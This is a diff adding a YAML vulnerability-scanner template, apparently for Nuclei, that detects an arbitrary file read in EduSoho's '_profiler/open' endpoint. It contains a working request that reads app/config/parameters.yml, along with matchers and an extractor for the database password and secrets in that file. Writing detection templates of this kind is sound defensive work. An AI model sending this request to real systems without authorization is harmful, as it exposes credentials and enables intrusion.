@@ -1,0 +1,33 @@
+id: edusoho-file-read
+info:
+  name: "EduSoho 接口文件读取漏洞"
+  author: ProjectDiscoveryAI
+  severity: high
+  description: |
+    EduSoho education and training system is vulnerable to file read via the `file` parameter in the `/app_dev.php/_profiler/open` endpoint. This allows remote attackers to read sensitive files, such as database configuration files, potentially exposing sensitive information like database credentials.
+  tags: edusoho
+  classification:
+    cvss-score: 7.5
+  reference:
+    - http://www.edusoho.com
+
+http:
+  - raw:
+      - |
+        GET /app_dev.php/_profiler/open?file=app/config/parameters.yml HTTP/1.1
+        Host: {{Hostname}}
+        Connection: close
+    matchers-condition: and
+    matchers:
+      - type: status
+        status:
+          - 200
+      - type: regex
+        regex:
+          - "database_password"
+          - "secret"
+    extractors:
+      - type: regex
+        name: file-contents
+        regex:
+          - "<code>(.*?)</code>"
